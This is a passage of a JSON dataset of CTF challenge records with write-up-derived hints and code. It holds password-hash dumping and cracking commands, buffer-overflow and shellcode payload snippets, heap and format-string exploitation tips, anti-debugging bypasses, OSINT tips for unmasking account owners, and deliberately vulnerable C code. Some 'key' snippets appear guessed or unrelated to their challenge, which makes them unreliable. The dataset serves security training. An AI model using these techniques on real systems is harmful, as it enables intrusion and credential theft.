            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 425,
        "max_score": 499,
        "difficulty": 0.8517034068136272,
        "knowledge": [
            "When dealing with password-protected RAR files in CTF challenges, and the scenario involves a Windows environment, it's important to check the Windows directory `/Windows/system32/config` for the SAM and SYSTEM files (`sam.hiv` and `system.hiv`). These files can contain hashed user passwords that, once extracted using tools like `samdump2`, can be cracked with password cracking tools such as John the Ripper (JTR) using a common wordlist like `rockyou.txt`. \n   \n   Example command to extract hashes: `samdump2 system.hiv sam.hiv > hashes.txt`",
            "After obtaining the hashes, use John the Ripper with the NT format and a comprehensive wordlist to crack the hashed passwords. This step relies on the availability of hashed passwords and suitable cracking tools. The effectiveness of this approach depends on the strength of the password and the completeness of the wordlist. \n\n   Example command to crack hashes: `john --format=NT hashes.txt --wordlist=/path/to/rockyou.txt`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint check_password(char *input) {\n    char password[] = \"easypeasy\";\n    return strcmp(input, password);\n}\n\nint main() {\n    char user_input[20];\n    printf(\"Enter password: \");\n    gets(user_input); // Vulnerable to buffer overflow\n    if (check_password(user_input) == 0) {\n        printf(\"Access granted.\\n\");\n    } else {\n        printf(\"Access denied.\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "WOLPHV V_ luvh4ck573",
        "write_up": "dataset/raw/WOLPHV V_ luvh4ck573.md",
        "type": "web",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges that involve identifying the owner of a social media account, one effective strategy is to search for usernames or unique identifiers across different platforms. This can lead you to unforeseen connections and additional information. For instance, discovering a username within a photo or video description on one platform (such as Tinder) could lead to a match on another platform (e.g., YouTube, Instagram), where the username is utilized in a similar or exact format. Utilizing search engines effectively, including searching for video titles or archived content, can reveal previously obscured or deleted information that is crucial for solving the puzzle.",
            "Utilizing specialized tools for gathering information about individuals based on their online presence can significantly advance the investigation in OSINT (Open Source Intelligence) challenges. For example, tools like Ghunt can be used to extract a real name or additional details from an email address found in publicly accessible archives or cached web pages. This method is particularly effective in scenarios where the challenge involves piecing together clues from various online sources to uncover a target's identity or location. Understanding and leveraging the capabilities of such tools can uncover new leads from seemingly insignificant details."
        ],
        "key": "```python\nimport requests\n\ndef get_user_info(username):\n    url = f\"https://api.socialmedia.com/user/{username}\"\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None\n\ndef main():\n    username = \"nathan-rizz-blog67945\"\n    user_info = get_user_info(username)\n    if user_info:\n        print(f\"User found: {user_info['name']}\")\n    else:\n        print(\"User not found\")\n\nif __name__ == \"__main__\":\n    main()\n```\n"
    },
    {
        "name": "woogie-boogie",
        "write_up": "dataset/raw/woogie-boogie.md",
        "type": "reverse",
        "competition": [
            "LA/2024",
            "https://ctftime.org/event/2102/tasks/"
        ],
        "score": 499,
        "max_score": 499,
        "difficulty": 1.0,
        "knowledge": [
            "For challenges involving Out-Of-Bounds (OOB) vulnerabilities, it can be exploited to gain unlimited relative stack access. This can be achieved by leveraging the ability to read or write to arbitrary stack locations that are not validated or bound-checked by the program. This type of vulnerability can be used to modify return addresses, manipulate function pointers, or leak memory addresses to defeat ASLR (Address Space Layout Randomization). To exploit such vulnerabilities, carefully crafted inputs or payloads that take advantage of the program's failure to validate offsets or lengths are required. These can lead to arbitrary code execution or leakage of sensitive information.",
            "XOR swap vulnerabilities can be ingeniously abused to manipulate memory in unintended ways, especially when combined with OOB vulnerabilities. Specifically, if a program allows swapping memory contents using XOR operations without properly checking the boundaries or the integrity of the operation, it's possible to create conditions where values in memory can be zeroed out or arbitrarily modified. This is particularly exploitable when the XOR operation involves pointers or indexes that can be controlled by an attacker, allowing for memory corruption or control-flow hijacking. A key strategy in exploiting such vulnerabilities involves crafting payloads that manipulate stored addresses or values in memory to alter program behavior or gain unauthorized access to system resources."
        ],
        "key": "```c\nundefined8 main(void) {  \n long woogie;  \n long boogie;  \n char buffer [8];  \n char zwi;  \n  \n setvbuf(stdout,(char *)0x0,1,0);  \n                   /* get relative long offsets from buffer and swap them */  \n while( true ) {  \n   write(1,\"woogie: \",8);  \n   woogie = readint();  \n   write(1,\"boogie: \",8);  \n   boogie = readint();  \n   if ((woogie == 0) && (boogie == 0)) break;  \n                   /* always 8 byte aligned */  \n   swap(buffer + woogie * 8,buffer + boogie * 8);  \n }  \n                   /* reverse (big endian) */  \n for (int i = 0; i < 4; i = i + 1) {  \n   zwi = buffer[i];  \n   buffer[i] = buffer[7 - (long)i];  \n   buffer[7 - (long)i] = zwi;  \n }  \n                   /* print value in buffer */  \n fwrite(buffer,1,8,stdout);  \n fflush(stdout);  \n write(1,\"\\n\",1);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Woooosh",
        "write_up": "dataset/raw/Woooosh.md",
        "type": "The type of this CTF challenge is **web**.",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 130,
        "max_score": 300,
        "difficulty": 0.43333333333333335,
        "knowledge": [
            "In challenges involving overcoming game mechanics or automated points scoring where direct exploitation or reverse engineering is impractical due to obfuscation or complexity, using automation scripts that interact with the game's graphical components can be an effective strategy. For example, a Python script utilizing `pyautogui` can be employed to continuously scan for and interact with specific elements on the screen, such as clicking a target icon, to achieve the necessary points for victory.\n\nExample payload:\n```python\nimport pyautogui\nfor x in range(200):  \n    dot = pyautogui.locateCenterOnScreen('dot.png', region=(665, 310, 580, 325))\n    if dot is not None:  \n        pyautogui.click(dot)\n```",
            "When developing an automation script to interact with application elements, especially in graphical user interface environments, it's crucial to optimize the search region for the target elements to improve performance and accuracy. In the provided Python script example, the search region for the target 'dot' is explicitly defined (`region=(665, 310, 580, 325)`) within `pyautogui.locateCenterOnScreen`. This method significantly reduces processing time by limiting the screen area that `pyautogui` needs to scan, increasing the efficiency of the script in real-time scenarios where speed is essential.\n\nExample payload:\n```python\n# Example of defining a search region for improved performance\ndot = pyautogui.locateCenterOnScreen('dot.png', region=(665, 310, 580, 325))\n```"
        ],
        "key": "```javascript\n// Possible vulnerable code snippet based on the context of obfuscated JavaScript\nfunction processInput(input) {\n    eval(input); // Vulnerable to code injection if input is not properly sanitized\n}\n```"
    },
    {
        "name": "wooter",
        "write_up": "dataset/raw/wooter.md",
        "type": "reverse",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing a binary's interaction model using tools like `strace`, if it shows no interaction with the filesystem (e.g., opening or reading files), it suggests that the input is either passed as arguments or through environment variables. This knowledge helps focus reverse engineering efforts on how the binary handles inputs directly provided to it, streamlining the analysis process.",
            "The technique of manipulating the outcome of the `rand()` function by hooking it to always return a fixed value (e.g., 0) can significantly speed up the execution of a binary. This is particularly useful when dealing with binaries that employ `rand()` calls to generate obfuscation or delay execution as a form of anti-analysis measure. By deploying a custom shared library with an overridden `rand()` that returns 0, the execution time can be drastically reduced, which aids in dynamic analysis and debugging processes.\n    - Example of C code for `norand.c` to override `rand()`:\n      ```c\n      int rand() { return 0; }\n      ```\n    - Example command to use the custom `norand.so` library:\n      ```sh\n      $ LD_PRELOAD=./norand.so ./binary\n      ```"
        ],
        "key": "```c\nif (rand() % 3 != 0) {\n\tint i = rand();\n\n\twhile (0 < i)\n\t\ti--;\n}\n```"
    },
    {
        "name": "worm 2",
        "write_up": "dataset/raw/worm 2.md",
        "type": "pwn",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 295,
        "max_score": 299,
        "difficulty": 0.9866220735785953,
        "knowledge": [
            "When encountering a binary with a stack-based buffer overflow vulnerability (BOF), specifically where input is read via an unsafe function like `gets()`, overflowing the buffer into adjacent variables can allow for control over those variables' values. This can be leveraged to meet certain condition checks within the program, such as authentication mechanisms. In scenarios where an adjacent variable to the buffer is checked against a specific value for authentication, carefully crafting the input to overflow the buffer and overwrite this variable with the expected value can grant unauthorized access.\n   - Example payload for overwriting an adjacent password variable to bypass authentication: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd`",
            "In challenges requiring the exploration of directory structures where directories represent nodes of a binary tree and the goal is finding a specific file, a depth-first search (DFS) approach can be effectively automated using a self-replicating script. This script recursively explores the tree by executing itself after gaining access to each subsequent node or directory with required privileges, thus covering all potential paths where the file could reside. The strategy combines gaining necessary privileges (e.g., through exploiting a binary in each node to escalate privileges or access restricted directories) and a self-replicating mechanism to traverse the binary tree structure efficiently within constraints such as a maximum character limit for the exploit code.\n   - Example self-replicating script payload part: Assume the script is stored as `/tmp/solve.sh`. To replicate and continue the search in directories `room0` and `room1`, the script could contain: \n     ```bash\n     payload=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp4ssw0rd\n     (echo $payload && echo \"cd room0 && exec bash /tmp/solve.sh\") | ./key > /dev/null\n     (echo $payload && echo \"cd room1 && exec bash /tmp/solve.sh\") | ./key > /dev/null\n     ```"
        ],
        "key": "```c\ntypedef struct {  \n   char name[32];  \n   char password[32];  \n} User;\n\nvoid auth() {  \n   printf(\"Authenticating ...\\n\");  \n   assert(setuid(ID) == 0);  \n   assert(setgid(ID) == 0);  \n   system(\"/bin/bash\");  \n}\n\nint main() {  \n   User user;\n\n   printf(\"Name: \");  \n   gets(user.name);\n\n   if (strncmp(user.password, \"p4ssw0rd\", 8) == 0) {  \n       auth();  \n   } else {  \n       printf(\"Unauthorized :(\\n\");  \n   }  \nreturn 0;  \n}  \n```"
    },
    {
        "name": "Write me a book",
        "write_up": "dataset/raw/Write me a book.md",
        "type": "pwn",
        "competition": [
            "GreyCatTheFlag/2023/Quals",
            "https://ctftime.org/event/1938/tasks/"
        ],
        "score": 349,
        "max_score": 349,
        "difficulty": 1.0,
        "knowledge": [
            "In heap exploitation challenges where overlapping chunks can be achieved, use out-of-bound writes to manipulate the chunk size or the forward pointer in the heap metadata. This can lead to arbitrary memory write or tcache poisoning, which allows for control over the heap and potentially executing arbitrary code. A specific technique is to overwrite a chunk's size to merge it with adjacent chunks, creating a larger, contiguous, and controllable region in memory.",
            "To leak libc addresses in environments where direct leaks are prevented or where PIE (Position Independent Executables) is enabled, utilize entries in the GOT (Global Offset Table) or output functions like `puts` to leak addresses. This approach entails overwriting entries in the GOT with the address of a libc function like `puts`, and subsequently invoking a function call that uses the overwritten GOT entry to leak a libc address. This technique can bypass restrictions on direct memory access and facilitate the calculation of the libc base address for further exploitation.\n\nExample payload for GOT overwrite to leak libc addresses:\n```python\nedit(2, pwn.flat([  \n       pwn.p64(exe.sym.puts)  # Overwrites free@got with puts' address.\n]))\nenable_print(3)\nlibc.address = libc_leak_free(1)  # free(1) now actually calls puts, leaking the address of a libc symbol.\n```"
        ],
        "key": "```c\nunsigned __int64 rewrite_book()  \n{  \n _QWORD *v0; // rcx  \n __int64 v1; // rdx  \n int idx; // [rsp+Ch] [rbp-14h] BYREF  \n ssize_t v4; // [rsp+10h] [rbp-10h]  \n unsigned __int64 v5; // [rsp+18h] [rbp-8h]\n\n v5 = __readfsqword(0x28u);  \n puts(\"\\nAt which index of the shelf would you like to rewrite your book?\");  \n printf(\"Index: \");  \n __isoc99_scanf(\"%d\", &idx);  \n getchar();  \n if ( idx > 0 && idx <= 10 && slot[2 * idx - 2] )  \n {  \n   --idx;  \n   puts(\"Write me the new contents of your book that is no longer than what it was before.\");  \n   v4 = read(0, slot[2 * idx], books[idx].size);  \n   v0 = (__int64 *)((char *)slot[2 * idx]->buf + v4);  \n   v1 = qword_4040D8;  \n   *v0 = author_signature;  \n   v0[1] = v1;  \n   puts(\"Your book has been rewritten!\\n\");  \n }  \n else  \n {  \n   puts(\"Invaid slot!\");  \n }  \n return v5 - __readfsqword(0x28u);  \n}  \n```"
    },
    {
        "name": "write-flag-where",
        "write_up": "dataset/raw/write-flag-where.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2023",
            "https://ctftime.org/event/1929/tasks/"
        ],
        "score": 50,
        "max_score": 320,
        "difficulty": 0.15625,
        "knowledge": [
            "In scenarios where a binary has Position Independent Executable (PIE) enabled, locating static data or code segments' actual runtime address requires calculating their addresses based on runtime memory mappings. This can be achieved by parsing the program's memory mappings from `/proc/self/maps`, identifying the base address of the binary, and adding the known offset to a target location (e.g., a string or function within the binary). This approach is particularly useful for exploiting vulnerabilities that require precise memory write operations. Example usage involves extracting the base address from `/proc/self/maps`, then calculating the target address by adding a known offset to this base address.",
            "When working with exploits that require interacting with a program's input/output, if direct interaction causes issues (e.g., due to redirections to `/dev/null` or modifications to file descriptors), consider using system settings or environment variables to bypass these limitations. For example, the `ulimit -n <number>` command can be used to increase the maximum number of open file descriptors for the current shell session, enabling interaction with file descriptors that the program assumes are unavailable or closed. This technique can be vital for exploiting binaries that manipulate their file descriptors to prevent easy interaction or exploitation."
        ],
        "key": "```c  \nint main(void)  \n{  \n   int maps_fd;  \n   char maps[0x1000];  // Buffer to store the contents of /proc/self/maps  \n   int flag_fd;  \n   char flag[0x80];    // Buffer to store the contents of flag.txt  \n   ssize_t num_bytes;  \n   int output_fd;  \n   int null_fd;  \n   int dup_result;  \n   int mem_fd;  \n   off64_t address;  \n   uint length;  \n   int scanf_result;  \n  \n   // Open and read the contents of /proc/self/maps  \n   maps_fd = open(\"/proc/self/maps\", 0);  \n   num_bytes = read(maps_fd, maps, 4096);  \n   close(maps_fd);  \n  \n   // Open and read the contents of flag.txt  \n   flag_fd = open(\"./flag.txt\", 0);  \n   if (flag_fd == -1) {  \n       puts(\"flag.txt not found\");  \n   } else {  \n       num_bytes = read(flag_fd, flag, 128);  \n       if (num_bytes > 0) {  \n           close(flag_fd);  \n  \n           // Duplicate file descriptor 1 (stdout) to 0x539  \n           dup_result = dup2(1, 1337);  \n  \n           // Open /dev/null for writing  \n           null_fd = open(\"/dev/null\", 2);  \n  \n           // Redirect stdin (0), stdout (1), and stderr (2) to /dev/null  \n           dup2(null_fd, 0);  \n           dup2(null_fd, 1);  \n           dup2(null_fd, 2);  \n           close(null_fd);  \n  \n           // Set an alarm for 60 seconds  \n           alarm(60);  \n  \n           // Write some introductory text and the contents of /proc/self/maps to the output  \n           dprintf(dup_result, \"This challenge is not a classical pwn\\n\"  \n                   \"In order to solve it will take skills of your own\\n\"  \n                   \"An excellent primitive you get for free\\n\"  \n                   \"Choose an address and I will write what I see\\n\"  \n                   \"But the author is cursed or perhaps it's just out of spite\\n\"  \n                   \"For the flag that you seek is the thing you will write\\n\"  \n                   \"ASLR isn't the challenge so I'll tell you what\\n\"  \n                   \"I'll give you my mappings so that you'll have a shot.\\n\");  \n           dprintf(dup_result, \"%s\\n\\n\", maps);  \n  \n           while (1) {  \n               // Prompt the user for an address and length  \n               dprintf(dup_result, \"Give me an address and a length just so:\\n\"  \n                       \"<address> <length>\\n\"  \n                       \"And I'll write it wherever you want it to go.\\n\"  \n                       \"If an exit is all that you desire\\n\"  \n                       \"Send me nothing and I will happily expire\\n\");  \n  \n               // Read the user's input  \n               scanf_result = scanf(\"%llx %u\", &address, &length);  \n  \n               // Check if the input was successfully parsed  \n               if (scanf_result != 2 || length > 128) {  \n                   break;  \n               }  \n  \n               // Open /proc/self/mem for writing  \n               mem_fd = open(\"/proc/self/mem\", 2);  \n               // Set the file position to the specified address  \n               lseek64(mem_fd, address, 0);  \n               // Write the contents of flag to the specified address  \n               write(mem_fd, flag, length);  \n               // Close /proc/self/mem  \n               close(mem_fd);  \n           }  \n           // Exit the program  \n           exit(0);  \n       }  \n       puts(\"flag.txt empty\");  \n   }  \n   return 1;  \n}  \n```"
    },
    {
        "name": "www",
        "write_up": "dataset/raw/www.md",
        "type": "pwn",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving a stack buffer overflow vulnerability where the size check is absent, specifically in a case where a fixed-size buffer is used to handle string copying or concatenation (like using `strcpy` or `strcat` without size checks), payloads can be crafted to overflow the buffer. This can lead to execution of arbitrary code when security measures like NX or ASLR are not present, or when stack addresses can be predicted. In such scenarios, incorporating NOP sleds followed by shellcode into the overflow payload can be effective since it allows for a jump to the shellcode placed in the stack to execute arbitrary commands.",
            "Utilizing write primitive vulnerabilities that allow for arbitrary writes into memory can be enhanced by overwriting control variables (e.g., loop control variables) to gain unlimited usage of the vulnerability. This technique is particularly useful in scenarios where limited exploitation attempts would otherwise be a constraint. After gaining unlimited write capabilities, format string vulnerabilities can be exploited to leak memory addresses (such as stack addresses and libc addresses) by controlling the format string passed to functions like `printf`. This information can then be used to convert relative write operations into absolute ones or to execute a ROP chain by overwriting function pointers or return addresses. \n\n   - Example payload snippet to overwrite a variable and gain unlimited writes:\n     ```c\n     write('\\x01', -7, buffer); // Assuming `amount` is at offset -7 from `buffer`\n     ``` \n\n   - Example for leaking addresses using format strings:\n     ```c\n     printf(\"%15$p\"); // Leaks stack address\n     printf(\"%13$p\"); // Leaks libc address\n     ```"
        ],
        "key": "```c  \n#ifdef __STDC__  \nint HTTP_Get(const char * arg)  \n#else  \nint HTTP_Get(arg)  \n   char * arg;  \n#endif  \n{  \n   int s;                  /* Socket number for returned data */  \n   char command[257];      /* The whole command */  \n   int status;             /* tcp return */\n\n   ...\n\n   strcpy(command, \"GET \");  \n   {  \n       char * p1 = HTParse(arg, \"\", PARSE_PATH|PARSE_PUNCTUATION);  \n       strcat(command, p1);  \n       free(p1);  \n   }\n```\n\n```c  \n#include <stdio.h>  \n#include <stdlib.h>  \n#include <unistd.h>\n\nvoid write(char what, long long int where, char* buf) {  \n   buf[where] = what;  \n}\n\nchar what() {  \n   char what;  \n   scanf(\"%c\", &what);  \n   getchar();  \n   return what;  \n}\n\nlong long int where() {  \n   long long int where;  \n   scanf(\"%lld\", &where);  \n   getchar();  \n   return where;  \n}\n\nint main(void) {  \n\tsetvbuf(stdout, NULL, _IONBF, 0);  \n   int amount = 1;  \n   char buf[] = \"Hello World!\";  \n   while (amount--) {  \n       write(what(), where(), buf);  \n   }  \n   printf(buf);  \n}  \n```"
    },
    {
        "name": "x0rr3al_",
        "write_up": "dataset/raw/x0rr3al_.md",
        "type": "reverse",
        "competition": [
            "vsCTF/2023",
            "https://ctftime.org/event/2053/tasks/"
        ],
        "score": -1.0,
        "max_score": 489,
        "difficulty": -1,
        "knowledge": [
            "When faced with a binary that performs string obfuscation using XOR operations, it's viable to reverse the XOR operation by applying the same XOR key to the obfuscated data. This approach can be used to reveal hidden strings within the binary. In scenarios where the XOR key and encoded strings are known, one can execute similar deobfuscation using a simple C program or script. This method involves using the XOR key against every byte of the obfuscated data to retrieve the original string. For example, given a byte of data `b` and a key `k`, the operation to retrieve the original byte would be `b ^= k;`.",
            "In binaries utilizing anti-debugging techniques such as ptrace or environmental checks (e.g., for debugger processes like gdb, ollydbg, strace), it's possible to bypass these by either modifying the binary to invert the branch that checks for the debugging environment or by using an LD_PRELOAD trick to override functions like strstr that are used for environment checks. This allows for debugging or analysis of the binary without being hindered by the anti-debugging measures. When dealing with strstr checks, an example LD_PRELOAD override could be as follows:\n   \n   ```c\n   char* strstr(const char* haystack, const char* needle) {\n     printf(\"haystack=%s and needle=%s\\n\", haystack, needle);\n     return 0;\n   }\n   ```\n   \n   This function could be compiled into a shared object and preloaded to intercept calls to `strstr`, thereby revealing what the binary is searching for in its anti-debugging checks and allowing a researcher to bypass them."
        ],
        "key": "```c\nint main(int argc, char** argv)  \n{  \n       char buf[0x50];  \n       memset(buf, 0, 0x50);\n\n       uint64_t* ptr = (uint64_t*) buf;\n\n       *ptr = 0x71267032217f2271;  \n       ptr++;  \n       *ptr = 0x6b327c217a653279;  \n       ptr++;  \n       *ptr = 0x357c216073326722;  \n       ptr++;  \n       *ptr = 0x2666322323733266;  \n       ptr++;\n\n       uint16_t* ptr2 = (uint16_t*) ptr;  \n       *ptr2 = 0x797e;  \n       ptr2++;\n\n       uint8_t* ptr3 = (uint8_t*) ptr2;  \n       *ptr3 = 0x33;  \n      for(int i = 0; i < strlen(buf); i++)  \n       {  \n               buf[i] ^= 0x12;  \n       }\n\n       printf(\"Buf %s\\n\", buf);\n\n       return 0;  \n}  \n```"
    },
    {
        "name": "xkcd",
        "write_up": "dataset/raw/xkcd.com_2247 v2.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2020",
            "https://ctftime.org/event/939/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with Hill Cipher challenges, if the encryption key is provided as a long string of characters, it may indicate the size of the encryption matrix. To decrypt, convert the encryption key to numerical values modulo 26 (representing each letter's position in the alphabet), organize them into a matrix of the given size, and then calculate the inverse of this matrix using mathematical software like SageMath to obtain the decryption matrix.",
            "Once the decryption matrix is obtained, apply it to the ciphertext, which has been similarly converted to numerical values, to decrypt the message. This involves left multiplying the ciphertext matrix by the decryption matrix. After performing the matrix multiplication, convert the resulting numerical values back to letters to reveal the plaintext. Use common sense or keyword searching through the decrypted text to locate the flag."
        ],
        "key": "```python\nenc_str = \"coqfvpbbvzohmogzjjquohnonabjqippelaxnorxrvaxdllwubieletjauv...\"\nenc_arr = [ord(x) - ord('a') for x in enc_str]\nenc_mat = Matrix(enc_arr, ring=Integers(26), nrows=100)\ndec_mat = enc_mat.inverse()\n\nciphertext_str = \"ieyirlxxtfiyfpsyvxcjmcdlpeftagszjhqjblyohgknhszyshfv...\"\nciphertext_arr = [ord(x) - ord('a') for x in ciphertext_str]\nciphertext_mat = Matrix(ciphertext_arr, ring=Integers(26), ncols=100).transpose()\nplaintext_mat = (dec_mat * ciphertext_mat).transpose()\nplaintext_arr = [int(x) for x in plaintext_mat.list()]\nplaintext_str = ''.join([chr(x + ord('a')) for x in plaintext_arr])\n```"
    },
    {
        "name": "xorz",
        "write_up": "dataset/raw/xorz.md",
        "type": "crypto",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 123,
        "max_score": 952,
        "difficulty": 0.12920168067226892,
        "knowledge": [
            "When given a ciphertext produced by a modified Vigenere cipher that involves XOR operations with both a key and a salt (constant string), first reverse the effect of the salt by XORing each byte of the ciphertext with the corresponding byte of the salt, cycled to the ciphertext's length. This preprocessing step simplifies the problem to a more traditional cipher structure, making it easier to apply further cryptographic analysis or brute force methods to retrieve the original plaintext or key.",
            "To break a modified Vigenere cipher that uses XOR operations and has unknown key length, apply frequency analysis across multiple possible key lengths. For each key length, organize the ciphertext into columns where each column corresponds to a character in the key. Perform frequency analysis on each column to identify the most likely byte value for each position in the key, based on expected letter frequencies in the plaintext language. This method exploits the statistical properties of the plaintext language (e.g., English) to infer the key.\n   \n   Example of frequency analysis logic for one possible key length:\n   ```\n   for k in keyPoolList[i]:\n       posFreq[k] = dict()\n       for c in cipher[i::keyLen]:\n           p = chr(k ^ c)\n           posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1\n   ```"
        ],
        "key": "```python  \nfrom itertools import *  \nfrom data import flag,plain\n\nkey=flag.strip(\"de1ctf{\").strip(\"}\")  \nassert(len(key)<38)  \nsalt=\"WeAreDe1taTeam\"  \nki=cycle(key)  \nsi=cycle(salt)  \ncipher = ''.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[2:].zfill(2) for\np in plain])  \nprint cipher  \n```"
    },
    {
        "name": "YABO",
        "write_up": "dataset/raw/YABO.md",
        "type": "pwn",
        "competition": [
            "HacktivityCon/2021",
            "https://ctftime.org/event/1444/tasks/"
        ],
        "score": 478,
        "max_score": 500,
        "difficulty": 0.956,
        "knowledge": [
            "For challenges involving buffer overflows where direct execution control is required, searching for and utilizing a 'jmp esp' gadget can be an effective method to redirect execution flow to the stack, where shellcode can be placed. This is particularly useful in environments without stack execution protections (e.g., NX disabled). The 'jmp esp' gadget can be found using tools like Ropper or similar. Once found, this address can be used to overwrite the return address in a buffer overflow exploit, allowing for arbitrary code execution.\n   - Example payload construction segment:\n     ```python\n     jmp_esp = next(binary.search(asm('jmp esp')))\n     payload  = b''  \n     payload += 0x414 * b'A'  \n     payload += p32(jmp_esp)  \n     payload += shellcode\n     ```",
            "In scenarios where interaction with a network service is required post-exploitation or where standard input/output is not directly available, leveraging file descriptor duplication functions (e.g., `dup2`) within shellcode to redirect standard file descriptors (`stdin`, `stdout`, `stderr`) to a network socket can enable interaction with spawned shells over the network. This is crucial in remote exploit scenarios or services wrapped with network interfaces. The information needed to perform this (e.g., the file descriptor number) can often be obtained through analysis tools such as `strace`.\n   - Example shellcode snippet using `shellcraft` from pwntools for readability:\n     ```python\n     shellcode = asm(shellcraft.dupsh(4))\n     ```\n   - In this case, `4` is the file descriptor for the network connection as commonly seen in CTF challenges where `stdin`, `stdout`, `stderr` are `0`, `1`, `2`, and the service listening socket is `3`, making the first accepted connection `4`."
        ],
        "key": "```c\nvoid vuln(int param_1)  \n{  \n char local_414 [1024];  \n ssize_t local_14;  \n char *local_10;  \n  \n local_10 = (char *)0x0;  \n local_10 = (char *)malloc(0xf00);  \n if (local_10 == (char *)0x0) {  \n   perror(\"Memory error\");  \n }  \n else {  \n   send(param_1,\"What would you like to say?: \",0x1d,0);  \n   local_14 = recv(param_1,local_10,0xeff,0);  \n   if (local_14 == -1) {  \n     perror(\"recv error\");  \n     free(local_10);  \n   }  \n   else {  \n     strcpy(local_414,local_10);  \n   }  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "yadlp",
        "write_up": "dataset/raw/yadlp.md",
        "type": "crypto",
        "competition": [
            "DownUnderCTF/2021",
            "https://ctftime.org/event/1312/tasks/"
        ],
        "score": 494,
        "max_score": 494,
        "difficulty": 1.0,
        "knowledge": [
            "When solving discrete logarithm problems in non-standard groups (such as hyperbolas rather than elliptic curves) and the operation law appears unconventional (e.g., based on Pell's equations or group laws not aligning with typical ECC operations), an effective approach involves identifying the group structure and applying specialized algorithms like Pohlig-Hellman for groups with known, factorizable orders. This process is facilitated by mapping out the operation, identity, and inversion within the group, enabling the use of algorithms optimized for these specific mathematical structures. For instance, when working with a hyperbolic curve group where the discrete log problem is set, verify the group's order (preferably smooth) and use Pohlig-Hellman algorithm for efficiency.\n\n    Conditions:\n    - The discrete logarithm problem is defined on non-elliptic curves, such as hyperbolas.\n    - The group order is smooth or factorizable into small primes.\n\n    Knowledge:\n    - For hyperbolic curve groups with discrete logarithm challenges, if the prime $$p \\equiv 3 \\pmod 4$$, the group order is likely $$p+1$$, allowing the Pohlig-Hellman algorithm to be applied effectively due to its dependence on the factorizability of the group's order.",
            "For solving the Modular Knapsack Problem, especially in cryptographic contexts where the goal is to find coefficients (e.g., $$x_0, ... x_5$$) that satisfy a modular equation with known summands, lattice-based methods, such as LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz) reduction, can be utilized. These methods are effective in reducing and solving complex modular equations by transforming them into lattice problems, which are then solved using algorithms designed for lattice operations. Tools and code snippets, like the one provided by `https://github.com/nneonneo/pwn-stuff/blob/master/math/solvelinmod.py`, can automate the resolution process, illustrating the practical utility of applying lattice theory in cryptographic challenges.\n\n    Conditions:\n    - The challenge involves solving an equation of the form $$ a x_0 + b x_1 + c x_2 + d x_3 + e x_4 + f x_5 \\equiv e \\pmod{p+1} $$.\n    - Coefficients and moduli are known, with the target being the discovery of the variables' values.\n\n    Knowledge:\n    - Lattice-based methods can efficiently resolve cryptographic problems framed as Modular Knapsack Problems by exploiting the mathematical properties of lattices to simplify and solve equations modularly, especially when traditional algebraic approaches (e.g., Gaussian elimination) prove ineffective."
        ],
        "key": "```python\ndef G_add(A, B):  \n   x1, y1 = A  \n   x2, y2 = B  \n   return ((x1*x2 + D*y1*y2) % p, (x1*y2 + x2*y1 + 2*y1*y2) % p)\n\ndef G_mul(A, k):  \n   out = (1, 0)  \n   while k > 0:  \n       if k & 1:  \n           out = G_add(out, A)  \n       A = G_add(A, A)  \n       k >>= 1  \n   return out\n\ndef get_elem(x):  \n   d = x**2 * (D + 1) - D  \n   if (x & 1 == d & 1) and kronecker(d, p) == 1:  \n       y = (x + sqrt(Zmod(p)(d))) * inverse_mod(D, p) % p  \n       return (x, y)  \n   else:  \n       return -1\n\ndef on_curve(A):  \n   x, y = A  \n   return (y*y*D -x*x - 2*x*y + 1)%p ==0  \n\nFLAG = open('flag.txt', 'rb').read().strip()  \nassert len(FLAG) % 8 == 0  \nM = [int.from_bytes(FLAG[i:i+8], 'big') for i in range(0, len(FLAG), 8)]  \nprint(f'{FLAG = }')  \nprint(f'{M = }')\n\nG = [rand_element() for _ in M]  \nc = (1, 0)  \nfor m, gi in zip(M, G):  \n   c = G_add(c, G_mul(gi, m))  \n```"
    },
    {
        "name": "YAY",
        "write_up": "dataset/raw/YAY.md",
        "type": "The type of this CTF challenge is reverse engineering.",
        "competition": [
            "Securinets/2021/Quals",
            "https://ctftime.org/event/1308/tasks/"
        ],
        "score": 988,
        "max_score": 1000,
        "difficulty": 0.988,
        "knowledge": [
            "When encountering anti-debugging techniques that use direct system calls or manipulation of thread properties to disable debugging, tools like ScyllaHide can be utilized to bypass such checks. ScyllaHide hooks onto these calls allowing the debugger to continue its operation unaffected by the anti-debugging tricks employed by the binary. An approach to bypass anti-debugging looks for functions using `NtSetInformationThread` with the `ThreadHideFromDebugger` flag and employing ScyllaHide or similar tools to neutralize their effects.",
